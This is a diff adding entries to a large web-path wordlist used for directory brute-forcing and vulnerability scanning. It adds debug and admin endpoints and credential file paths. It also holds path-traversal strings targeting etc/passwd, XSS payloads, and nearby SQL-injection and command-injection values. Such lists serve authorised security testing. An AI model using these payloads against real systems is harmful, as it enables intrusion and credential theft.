@@ -271,6 +271,7 @@ _capca.php
 _captcha
 _cart
 _cartNav.cfm
+_cat
 _cat/health
 _cat/indices
 _cat/indices?v
@@ -308,6 +309,7 @@ _clients
 _closed.html
 _cluster/health
 _cluster/health?pretty
+_cluster/stats
 _cm_admin
 _cms
 _code
@@ -357,6 +359,7 @@ _copy
 _core
 _counter
 _cover
+_cperror
 _cpix
 _CPiX
 _cron
@@ -416,6 +419,7 @@ _dbase
 _de
 _dealership
 _debug
+_debug_toolbar
 _debug_toolbar/
 _debugbar
 _debugbar/clockwork/1
@@ -926,6 +930,7 @@ _next/../../../../../../../../../../etc/passwd
 _next/static/../server/pages-manifest.json
 _nipd
 _nocrawl
+_nodes/stats
 _notes
 _notes/
 _notes/dwsync.xml
@@ -1072,7 +1077,9 @@ _process-email.cfm
 _prod
 _profile
 _profiler
+_profiler/
 _profiler/empty/search/results
+_profiler/empty/search/results?limit=10
 _profiler/phpinfo
 _profiler/phpinfo.php
 _project
@@ -1221,6 +1228,7 @@ _smarty
 _sms
 _social
 _solmyr.php
+_something_.cfm
 _sounds
 _source
 _sources
@@ -1541,6 +1549,7 @@ _vti-pvt
 _vti-txt
 _w
 _wdt
+_wdt/
 _we_info5
 _web_inf
 _WEB_INF
@@ -1592,7 +1601,13 @@ _zh
 _zip
 _zzConfig
 -
+-/health
+-/healthy
+-/liveness
+-/readiness
+-/ready
 -/snippets
+-/whoami
 -receiver.html
 -receiver(1).html
 ：
@@ -1704,6 +1719,13 @@ _zzConfig
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 ..%3B/monitoring
 ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
+..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
+..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
+..%5c..%5c..%5c..%5c..%5cetc/passwd
+..%5c..%5c..%5c..%5cetc/passwd
+..%5c..%5c..%5cetc/passwd
+..%5c..%5cetc/passwd
+..%5cetc/passwd
 .*org/login
 ./../../../../../../../../../../etc/passwd
 ./../proc
@@ -1839,6 +1861,7 @@ _zzConfig
 .aws/cli/cache
 .aws/config
 .aws/credentials
+.aws/credentials.gpg
 .aws/credentials.ini
 .aws/creds
 .aws/session
@@ -2399,6 +2422,8 @@ _zzConfig
 .config/deluge/web.conf
 .config/deluge/web.conf~
 .config/doctl/config.yaml
+.config/filezilla/filezilla.xml
+.config/filezilla/recentservers.xml
 .config/filezilla/sitemanager.xml.xml
 .config/firebase/credentials.json
 .config/gatsby/config.json
@@ -2415,9 +2440,11 @@ _zzConfig
 .config/gcloud/gce
 .config/gcloud/legacy_credentials
 .config/gcloud/logs
+.config/hexchat
 .config/karma.conf.coffee
 .config/karma.conf.js
 .config/karma.conf.ts
+.config/monero-project/monero-core.conf
 .config/novaclient
 .config/openstack
 .config/openstack/clouds.yaml
@@ -2518,6 +2545,7 @@ _zzConfig
 .datadog-agent/agent.yaml
 .DateJS.bak
 .DAV
+.davfs2
 .db
 .db.xml
 .db.yaml
@@ -2584,6 +2612,7 @@ _zzConfig
 .docker-options-staging
 .docker-options-testing
 .docker/.env
+.docker/ca.pem
 .docker/config.json
 .docker/daemon.json
 .docker/laravel/app/.env
@@ -3579,6 +3608,8 @@ _zzConfig
 .idea/encodings.xml
 .idea/gradle.xml
 .idea/httprequests
+.idea/httpRequests/http-client.cookies
+.idea/httpRequests/http-requests-log.http
 .idea/inspectionprofiles/project_default.xml
 .idea/inspectionProfiles/Project_Default.xml
 .idea/jslibrarymappings.xml
@@ -3588,6 +3619,7 @@ _zzConfig
 .idea/modules.xml
 .idea/mongosettings.xml
 .idea/naveditor.xml
+.idea/php.xml
 .idea/replstate.xml
 .idea/runconfigurations.xml
 .idea/runConfigurations.xml
@@ -4220,6 +4252,7 @@ _zzConfig
 .pass
 .passes
 .passwd
+.passwd-s3fs
 .password
 .passwords
 .passwrd
@@ -4430,6 +4463,7 @@ _zzConfig
 .pulumi
 .puppet
 .puppet-lint.rc
+.purple/accounts.xml
 .putty/my.ppk
 .putty/putty.ppk
 .pwd
@@ -4597,6 +4631,7 @@ _zzConfig
 .s3.yml
 .s3backupstatus
 .s3cfg
+.s3ql/authinfo2
 .sailsrc
 .salesforce/credentials
 .sample
@@ -4676,6 +4711,7 @@ _zzConfig
 .sh_history_backup
 .sharepoint/credentials
 .shell.pre-oh-my-zsh
+.shodan/api_key
 .shopsuite
 .shrc
 .shtml
@@ -5130,6 +5166,7 @@ _zzConfig
 .vs
 .vs/
 .vscode
+.vscode/
 .vscode/.env
 .vscode/extensions
 .vscode/extensions.json
@@ -14241,6 +14278,7 @@ abrucena
 abruzzo
 abs
 Abs
+abs/
 abse.js
 absent
 abshop.js
@@ -15486,6 +15524,7 @@ actuator/env/tz
 actuator/events
 actuator/exportregisteredservices
 actuator/exportRegisteredServices
+actuator/favicon.ico
 actuator/features
 actuator/flyway
 actuator/gateway/routes
@@ -15537,6 +15576,7 @@ actuator/trace
 actuator/transactions
 actuators
 actuators.js
+actuators/
 actuators/dump
 actuators/env
 actuators/health
@@ -16383,6 +16423,7 @@ adforward.php
 adframe.php
 adfs/ls/?samlrequest
 adfs/ls/idpinitiatedsignon
+adfs/ls/idpinitiatedsignon.aspx
 adfs/oauth2/authorize
 adfs/services/trust/2005/windowstransport
 ADFSCertificate.crt
@@ -16441,6 +16482,7 @@ Adjudications
 adjuggler
 adjunct
 adjuncts/3a890183
+adjuncts/3a890183/
 adjuntos
 adjust
 adjusthue.js
@@ -17491,6 +17533,8 @@ admin-web
 admin-wjg
 admin;
 Admin;
+admin;/
+Admin;/
 admin?param
 admin..;
 admin../admin
@@ -17605,6 +17649,7 @@ admin.woa
 admin.xml
 admin.zip
 admin/
+Admin/
 admin/_dump
 admin/_logs/access_log
 admin/_logs/access-log
@@ -17625,6 +17670,7 @@ admin/.htaccess
 admin/.json
 admin/.pac
 admin//phpmyadmin
+admin//phpmyadmin/
 admin/%3bindex
 admin/~
 admin/access_log
@@ -17721,6 +17767,7 @@ admin/banner.php
 admin/banners_report.php
 admin/base.html
 admin/bootstrap.inc.php?mgp=danc3uf@t&c=whoami
+admin/buoy
 admin/cache_stats.jsp
 admin/cai/loaycai.mdb
 admin/category.php
@@ -17730,6 +17777,7 @@ admin/checklogin.php
 admin/closer.jsp
 admin/common/helplinks.xml
 admin/config
+admin/config.json
 admin/config.php
 admin/config.php?password%5b0%5d=zizo&username=admin
 admin/config.php#
@@ -17822,6 +17870,7 @@ admin/eWebEditor/db/ewebeditor.mdb
 admin/ewebeditor/db/ewebeditor1013.mdb
 admin/eWebEditordb/ewebeditor.mdb
 admin/export.php
+admin/expvar
 admin/extensions
 admin/extras
 admin/fckeditor
@@ -17846,8 +17895,10 @@ admin/form.php
 Admin/frmWelcome.aspx
 admin/gallery.php
 admin/gb/gb.mdb
+admin/gc
 admin/header.jsp
 admin/headline.php
+admin/heap
 admin/heapdump
 admin/help.cgi
 admin/help.cgi.bak
@@ -17957,6 +18008,7 @@ admin/mediaManagement.js
 admin/member_home.php
 admin/memory/dump
 admin/memory/generateHeapDump
+admin/metrics
 admin/modelsview
 admin/moderator.php
 admin/my_account.php
@@ -17968,6 +18020,7 @@ admin/mysql2/index.php
 admin/notsupported.jsp
 admin/orderManagement.js
 admin/organizer.jsp
+admin/outgoing
 admin/overview.php
 admin/page_management.php
 admin/pages/home_admin.php
@@ -17982,6 +18035,7 @@ admin/phpmyadmin/scripts/setup.php
 admin/phpMyAdmin/server_import.php
 admin/phpmyadmin2
 admin/phpmyadmin2/index.php
+admin/ping
 admin/pma
 admin/pMA
 admin/pma/index.php
@@ -17991,12 +18045,24 @@ admin/pma/server_import.php
 admin/pol_log.txt
 admin/portalcollect.php?f=http://xxx&t=js
 admin/post
+admin/pprof
 Admin/private
 admin/private/logs
 admin/product.php
 admin/productManagement.js
 admin/products.php
 admin/proxy.pac
+admin/proxy/config.json
+admin/proxy/configs
+admin/proxy/discovery
+admin/proxy/metrics
+admin/proxy/routes
+admin/proxy/servers
+admin/proxy/svc
+admin/proxy/tap
+admin/proxy/tree
+admin/proxy/vars
+admin/proxy/versions
 admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
 admin/pydev
 admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
@@ -18006,6 +18072,8 @@ admin/release
 admin/reporting.js
 admin/reports/dblog
 admin/roleManagement.js
+admin/routes
+admin/runtime/tree
 admin/salesManagement.js
 admin/sample/tealeafj2ee.xml
 admin/save.php
@@ -18041,12 +18109,16 @@ admin/start/index.php
 admin/sxd
 admin/sysadmin
 admin/sysadmin/index.php
+admin/tap
 admin/template/article_more/config.htm
 admin/test
+admin/threadz
 admin/tiny_mce
 admin/tinymce
+admin/tls
 admin/tmp.mdb
 admin/tools/a--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+admin/tracing
 admin/uhome.html
 admin/upload.asp
 admin/upload.php
@@ -20445,6 +20517,7 @@ aimg
 aimole.js
 aims
 aims/ps
+aims/ps/
 aimspread.js
 aimtoday
 aindex.php
@@ -22249,6 +22322,7 @@ analytics/index.php
 analytics/jbips/messagebroker/as/
 analytics/saw.dll?bieehome&startPage=1
 analytics/saw.dll?bieehome&startpage=1#grabautologincookies
+analytics/saw.dll?bieehome&startPage=1#grabautologincookies
 analytics/saw.dll?getpreviewimage&previewfilepath=/etc/passwd
 analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
 analyticstracking.php
@@ -23358,6 +23432,7 @@ api/data/v9.1/leads
 api/data/v9.1/leads/
 api/dbstat/gettablessize
 api/debug/schedlock
+api/dependencies
 api/device/days
 api/device/details
 api/device/ip
@@ -23387,6 +23462,7 @@ api/experimental/test
 api/expr
 api/ext/exp_gaming
 api/fabrick/third-parties/mastercard/idcm/creditdunord/v1.9/mbe-callback/refbe
+api/falco
 api/feeds_service
 api/file
 api/filemanager?path=%2F..%2f..%2fContent
@@ -23441,6 +23517,7 @@ api/ip/info
 api/jobs
 api/jolokia/read
 api/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html
+api/jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html
 api/jsonpcallback
 api/jsonws
 api/jsonws/expandocolumn/update-column
@@ -23498,6 +23575,7 @@ api/oomco_payment/submit-transaction-data
 api/oomco_payment/submit-transaction-data-debug
 api/open
 api/opentsdb/version
+api/operations
 api/order
 api/otp/verify
 api/owner
@@ -23510,6 +23588,8 @@ api/perspective/securities/investdetails
 api/ping
 api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp
 api/plugin/details
+api/plugins.json
+api/plugins.json.xz
 api/post
 api/product/toprank
 api/profile
@@ -23559,6 +23639,7 @@ api/service
 api/service/ip/
 api/service/list
 api/service/ping
+api/services
 api/sessions
 api/set_status.php
 api/settings
@@ -23618,6 +23699,7 @@ api/terminaldata
 api/third/videodetail
 api/timelion/run
 api/token
+api/traces
 api/track
 api/tracking
 api/trainer
@@ -23668,16 +23750,19 @@ api/v1/account/users/summaries
 api/v1/actuator/dump
 api/v1/actuator/heapdump
 api/v1/alarm-center
+api/v1/alerts
 api/v1/analytics/events
 api/v1/api-docs
 api/v1/apidocs
 api/v1/app/
+api/v1/application.wadl
 api/v1/applications
 api/v1/articles.json
 api/v1/artifacts
 api/v1/asset/asset
 api/v1/asset/assets
 api/v1/auth
+api/v1/authorities
 api/v1/backend/
 api/v1/blotter
 api/v1/blotter/msg
@@ -23750,6 +23835,8 @@ api/v1/invest
 api/v1/knowledge
 api/v1/knowledge-shortcut
 api/v1/label/__name__/values
+api/v1/label/<label_name>/values
+api/v1/label/job/values
 api/v1/label/version/values
 api/v1/labels
 api/v1/languages
@@ -23757,6 +23844,7 @@ api/v1/log
 api/v1/log/diagnostics
 api/v1/map
 api/v1/me
+api/v1/metadata
 api/v1/method
 api/v1/method/logs
 api/v1/monitoring/accounts
@@ -23792,14 +23880,20 @@ api/v1/profile
 api/v1/proxy_success
 api/v1/proxy_timeout
 api/v1/qbridge
+api/v1/query
+api/v1/query_range
+api/v1/query_range?query=up&start=1633730000&end=1633733600&step=15s
 api/v1/quotes
 api/v1/registration
 api/v1/registry
 api/v1/remark
 api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27
+api/v1/repositories
 api/v1/roles
+api/v1/rules
 api/v1/savefile
 api/v1/secrets
+api/v1/series
 api/v1/serviceaccounts
 api/v1/services
 api/v1/session
@@ -23810,6 +23904,11 @@ api/v1/sms-sender
 api/v1/stat
 api/v1/status/config
 api/v1/status/flags
+api/v1/status/label/<label_name>
+api/v1/status/metadata
+api/v1/status/rules
+api/v1/status/tsdb
+api/v1/status/tsdb/rules
 api/v1/subscribe
 api/v1/swagger
 api/v1/swagger-ui
@@ -23861,9 +23960,15 @@ api/v1/users/list
 api/v1/visits
 api/v2
 api/v2.0
+api/v2.0/configuration
+api/v2.0/health
+api/v2.0/preference
+api/v2.0/projects
+api/v2.0/statistics
 api/v2.0/swagger.json
 api/v2.0/swagger.yaml
 api/v2.0/systeminfo
+api/v2.0/users
 api/v2.2
 api/v2/
 api/v2/accounts
@@ -23872,6 +23977,7 @@ api/v2/actuator/heapdump
 api/v2/api-docs
 api/v2/apidocs
 api/v2/app/
+api/v2/application.wadl
 api/v2/auth
 api/v2/bid
 api/v2/collector
@@ -23933,8 +24039,12 @@ api/v4
 api/v4.0
 api/v4/actuator/dump
 api/v4/actuator/heapdump
+api/v4/application/settings
 api/v4/ci/lint
 api/v4/groups
+api/v4/internal/allowed
+api/v4/internal/check
+api/v4/internal/lfs_authenticate
 api/v4/projects
 api/v4/users
 api/v5
@@ -23942,6 +24052,7 @@ api/v5.0
 api/v5/actuator/dump
 api/v5/actuator/heapdump
 api/v6.0
+api/values/1
 api/vendor/phpunit/phpunit/phpunit
 api/version
 api/Version
@@ -24063,6 +24174,7 @@ apis/authorization.k8s.io
 apis/authorization.k8s.io/v1
 apis/autoscaling
 apis/batch
+apis/ceph.rook.io/v1/namespaces/default/clusters/my-cluster
 apis/certificates.k8s.io
 apis/core
 apis/extensions
@@ -24194,6 +24306,7 @@ App_data
 App_Data
 APP_DATA
 app_data.php
+App_Data/
 App_Data/App_Data.mdb
 App_Data/data.mdb
 App_Data/database.mdb
@@ -24204,6 +24317,7 @@ app_datserletestudentpro.sql
 app_debug
 app_dev.php
 app_dev.php/_profiler
+app_dev.php/cache
 app_dir/.env
 app_driver.py
 app_environment.py
@@ -26633,6 +26747,7 @@ assets.rb
 assets.ts
 Assets.xcassets
 assets/.env
+assets/.gitignore
 assets/application-9a86c79d66aa9f6d94d43dfe9019b20be9509e86cdc8dabffb7f074a118c0013.js
 assets/application.js
 assets/backend/elfinder/elfinder-cke.html
@@ -26931,6 +27046,7 @@ asynchbeans
 asynchbeans/docs
 asynchpeople
 asynchPeople
+asynchPeople/
 asyncio.js
 asynclog.js
 asynconly.js
@@ -27609,6 +27725,7 @@ auth/register
 auth/sign_up
 auth/signin
 auth/signup
+auth/token
 authadmin
 authadmin.asp
 authadmin.aspx
@@ -27931,6 +28048,7 @@ autodiscover.bd
 autodiscover.old
 autodiscover.tmp
 autodiscover.xml
+autodiscover/
 autodiscover/autodiscover.xml
 autodownload.html
 autoemail
@@ -28230,6 +28348,7 @@ autotopup_old
 autotrader
 autotrans.js
 autoupdate
+autoupdate/
 AutoUpdates
 autoupgrade
 autoverhuur
@@ -28678,6 +28797,7 @@ awstats.conf
 awstats.old
 awstats.php
 awstats.pl
+awstats/
 awstats/.env
 awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E
 awstats/data
@@ -32060,6 +32180,7 @@ bin/a1stats/a1disp3.cgi
 bin/a1stats/a1disp4.cgi
 bin/admin.cgi
 bin/auktion.cgi
+bin/catalina.sh
 bin/commerce.cgi
 bin/company.web.api.dll
 bin/config.bat
@@ -32964,6 +33085,7 @@ blog/blogdata/L-BLOG.mdb
 blog/error_log
 blog/fckeditor
 blog/phpmyadmin
+blog/phpmyadmin/
 blog/phpmyadmin/scripts/setup.php
 blog/robots.txt
 blog/vendor/phpunit/phpunit/src/util/php/eval-stdin.php
@@ -34568,6 +34690,7 @@ bright
 brightbox.js
 brightcove
 brightmail/servlet/com.ve.kavachart.servlet.chartstream?sn=../../web
+brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB
 brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/
 brighton
 brightstation
@@ -35297,6 +35420,7 @@ bundleartifacts
 BundleArtifacts
 bundled-libs
 bundles
+bundles/kibana.style.css
 bundles/login.bundle.js
 bundly.js
 bungalow
@@ -38920,6 +39044,7 @@ certcloak.js
 certcontrol
 certdemo.js
 certenroll
+certenroll/
 certi.php
 certicom
 certif
@@ -38982,12 +39107,14 @@ certlinks.js
 certmanager.yml
 certPic
 certprov
+certprov/
 certs
 Certs
 CERTS
 certs/server.key
 certsrv
 certsrv.nsf
+certsrv/
 certstart.aspx
 certutils.js
 cerulean
@@ -39109,6 +39236,12 @@ CFIDE/administrator
 CFIDE/Administrator
 CFIDE/administrator/enter.cfm
 CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
+cfide/administrator/images/background.jpg
+CFIDE/administrator/images/background.jpg
+cfide/administrator/images/componentutilslogin.jpg
+CFIDE/administrator/images/componentutilslogin.jpg
+cfide/administrator/images/mx_login.gif
+CFIDE/administrator/images/mx_login.gif
 cfide/administrator/index.cfm
 CFIDE/administrator/index.cfm
 cfide/administrator/startstop.html
@@ -39478,6 +39611,8 @@ cgi-bin/mt/mt.cgi
 cgi-bin/mt7/mt-xmlrpc.cgi
 cgi-bin/mt7/mt.cgi
 cgi-bin/multimon.cgi
+cgi-bin/nagios3/status.cgi
+cgi-bin/nagios4/status.cgi
 cgi-bin/netauth.cgi
 cgi-bin/newsdesk.cgi
 cgi-bin/nobody
@@ -42068,6 +42203,7 @@ ckeditor/ckfinder/core/connector/aspx/connector.aspx
 ckeditor/ckfinder/core/connector/php/connector.php
 ckeditor/ckfinder/install.txt
 ckeditor/samples
+ckeditor/samples/
 ckey.asp
 ckfinder
 CKFinder
@@ -45769,6 +45905,8 @@ conf/
 conf/.env
 conf/caches.dat
 conf/caches.properties
+conf/cassandra-env.sh
+conf/cassandra.yaml
 conf/catalina
 conf/Catalina
 conf/catalina.policy
@@ -45783,6 +45921,7 @@ conf/defaults.ini
 conf/editors.properties
 conf/fastcgi_params
 conf/fastcgi.conf
+conf/httpd.conf
 conf/interpreter.json
 conf/jetty-https.xml
 conf/jetty.xml
@@ -45949,6 +46088,7 @@ config_dev.xml
 config_dev.yaml
 config_dev.yml
 config_development_secret.py
+config_dump
 config_example.ini
 config_example.json
 config_example.php
@@ -46601,6 +46741,7 @@ config/database.yaml.sqlite3
 config/database.yaml~
 config/database.yml
 config/database.yml_original
+config/database.yml.enc
 config/database.yml.pgsql
 config/database.yml.sqlite3
 config/database.yml~
@@ -46629,6 +46770,7 @@ config/development.py
 config/development.yaml
 config/development.yml
 config/dompdf.php
+config/elasticsearch.yml
 config/elixir.php
 config/email.php
 config/ember-cli-build.js
@@ -46829,6 +46971,7 @@ config/initializers/warden.rb
 config/initializers/webpacker.rb
 config/initializers/workhorse.rb
 config/initializers/wrap_parameters.rb
+config/jvm.options
 config/jwt.config.ts
 config/jwt.php
 config/jwt/private.pem
@@ -46845,6 +46988,7 @@ config/locales/ja.yaml
 config/locales/ja.yml
 config/locales/simple_form.en.yaml
 config/locales/simple_form.en.yml
+config/log4j2.properties
 config/logging.php
 config/logviewer.searches.config.js
 config/mail.php
@@ -47181,6 +47325,7 @@ config/typeorm.config.ts
 config/umbracosettings.config
 config/unicorn.rb
 config/update.php
+config/user.xml
 config/users.xml
 config/validation.php
 config/view.php
@@ -47590,6 +47735,7 @@ connexion.html
 connexion.php
 Connexion.php
 connie
+connz
 conpresso
 conqat.js
 conquest
@@ -48224,6 +48370,7 @@ containerization.ps1
 containerization.sh
 containerization.txt
 containerization.xml
+containerLogs
 containerregistry/.env
 ContainerRegistry/.env
 containers
@@ -48626,6 +48773,7 @@ control.ts
 control.txt
 control/login
 control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+control/stream?contentId=<svg/onload=alert(1)>
 control01.ctl
 control2
 controlador
@@ -50715,6 +50863,8 @@ cs.php
 cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
 cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX<svg/onload=alert(document.domain)>
 cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX<svg/onload=alert(document.domain)>&dSecurityGroup=&QueryText=(dInDate+>=+%60<$dateCurrent(-7)$>%60)&PageTitle=OO
+cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(
+cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(
 cs&t
 cs1
 cs7
@@ -52556,6 +52706,7 @@ dark.htm
 darke
 darkness
 darkside
+darkstat/
 darkwave
 darkwet
 darlington
@@ -52581,6 +52732,7 @@ daryl
 das
 das-haus
 dasbhoard
+dasbhoard/
 dasepp_php_gb
 dash
 dasha
@@ -52762,6 +52914,7 @@ data.txt
 data.txt.gz
 data.xml
 data.zip
+data/
 data/.env
 data/.git/config
 Data/0791idc.mdb
@@ -52786,6 +52939,7 @@ data/database_test.sqlite
 data/Database.mdb
 data/database.sqlite
 Data/db.mdb
+data/db/mysql/user.frm
 data/db1.mdb
 data/debug
 data/doctrineormmodule/cache
@@ -52812,6 +52966,7 @@ Data/MeskyDMS_Data.mdb
 data/music.mdb
 Data/oblog4.60.mdb
 data/pbootcms.db
+data/pgdata/pg_hba.conf
 data/plugins_listing
 data/qcdn_news.mdb
 data/scadata.mdb
@@ -52822,6 +52977,7 @@ Data/Test.mdb
 data/tmp
 data/tour.mdb
 data/version-2
+data/version-2/
 data/WRMPS.mdb
 Data/Ylmv_data.mdb
 DATA/zblog.mdb
@@ -53941,6 +54097,7 @@ db.txt.gz
 db.xml
 db.yaml
 db.zip
+db/
 db/_all_docs
 db/_changes
 db/_design/test/_view/testview
@@ -54753,19 +54910,35 @@ debug/default/view.html
 debug/flush
 debug/gc-heap-dump
 debug/generate-heap-dump
+debug/health
 debug/heapdump
 debug/info
+debug/log
 debug/metrics
+debug/mysql_debug/pprof
+debug/mysql_debug/vars
+debug/mysql_schema
+debug/mysql_stats/queries
+debug/mysql_stats/schema
+debug/mysql_stats/vschema
+debug/mysql_waiters
 debug/pprof
+debug/pprof/block
 debug/pprof/cmdline
 debug/pprof/goroutine?debug=1
 debug/pprof/heap
 debug/pprof/profile
 debug/pprof/symbol
+debug/pprof/threadcreate
 debug/pprof/trace
 debug/query_plans
+debug/queryz
+debug/requests
+debug/route/
+debug/schemaz
 debug/stopper
 debug/toolbar
+debug/tschema
 debug/vars
 debug/vschema
 debugallocation_test.sh
@@ -57860,9 +58033,11 @@ doc/.env
 doc/api
 doc/en/changes.html
 doc/html/index.html
+doc/page/login.asp
 doc/play
 doc/readme_for_app
 doc/README_FOR_APP
+doc/script/common.js
 doc/stable.version
 DOC1.pdf
 docbank
@@ -62352,6 +62527,7 @@ email.txt
 email.yaml
 email.yml
 email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E
 email1
 email1.html
 email2
@@ -65150,6 +65326,7 @@ etc.json?FNZ.ico
 etc.json/FNZ.html
 etc.json/FNZ.ico
 etc.xml
+etc/
 etc/1inkchecker.html
 etc/api.xml
 etc/api2.xml
@@ -65814,6 +65991,7 @@ evil.com/..;/css
 evil.com/%2f..bak
 evil.js
 evil%e3%80%82com
+evil%E3%80%82com
 evilducks.js
 evils.js
 evilsentinel
@@ -66379,6 +66557,8 @@ explorer
 Explorer
 explorer.cfm
 explorer.html
+explorer/api-docs
+explorer/swagger-ui
 explosao.js
 explotiv.js
 expmatch
@@ -66464,6 +66644,7 @@ expoviaje2004
 express
 Express
 express-graphql
+express-server.js
 express-session.js
 express-validation-schema.js
 express-validation-schema.json
@@ -68045,6 +68226,7 @@ fed-e-task-02-01/code/gulp/.npmrc
 fed.rpc.solo.io.GlooInstanceApi/ListClusterDetails
 fedatifis.js
 federal
+federate
 federated.js
 federico
 federo.js
@@ -69203,6 +69385,7 @@ filter.aspx
 filter.html
 filter.java
 filter.php
+filter/jmol/iframe.php?_USE=%22};alert(1337);//
 filter/jmol/js/jsmol/php/jsmol.php?call=getrawdatafromdatabase&query=file
 filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file
 filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
@@ -70007,6 +70190,7 @@ flask-testing.cfg
 flask-upload.cfg
 flask-wtf.cfg
 flask.cfg
+flask.session
 flat
 flat.php
 flatcal
@@ -75214,6 +75398,7 @@ git-gui.sh
 git-jira-log
 git-log.txt
 git-prompt.sh
+git-receive-pack
 git-service
 git-subtree-check.sh
 git.php
@@ -76597,7 +76782,9 @@ graphImages
 graphin.js
 graphing
 graphiql
+graphiql.css
 graphiql.js
+graphiql.min.css
 graphiql.min.js
 graphiql.php
 graphiql/finland
@@ -77891,6 +78078,7 @@ hadoop-site-include.xml
 hadoop-site-local.xml
 hadoop-site-override.xml
 hadoop.sh
+hadoop/logs/userlogs/job_id/attempt_id/container_id/stdout
 haendler
 haendlerbereich
 Haendlerforum
@@ -80492,6 +80680,7 @@ hope
 Hope
 hope-wsv
 hopewell-city
+hopfully404
 hophead.js
 hopkins
 hopla.js
@@ -84482,6 +84671,7 @@ includes-old
 includes.inc
 includes.ini
 includes.php
+includes/.gitignore
 includes/.htaccess
 includes/actions.inc
 includes/adovbs.inc
@@ -84967,6 +85157,7 @@ index.php/2017/06/11/caiqian
 index.php/2017/06/11/sumiao
 index.php/2017/06/13/youhuaban
 index.php/admin
+index.php/admin/
 index.php/admin/admin/login/index/
 index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd
 index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
@@ -85551,6 +85742,8 @@ info.swf
 info.ts
 info.txt
 infO.txt
+info/
+info/status
 info/system/_application.htm
 info1.html
 info1.php
@@ -86069,6 +86262,7 @@ innovative-tests
 Innovative.asp
 innoweb
 inogire.js
+inormalydonotexist
 inosans.js
 inotes
 iNotes
@@ -86696,6 +86890,7 @@ interactive
 Interactive
 interactive.html
 interactive/admin.php
+interactive/docs
 InteractiveForms
 interactivephp
 interactives
@@ -86892,6 +87087,7 @@ internships
 internships.html
 internt
 interpret
+interpreter
 interpreter.json
 interpreters
 intersect
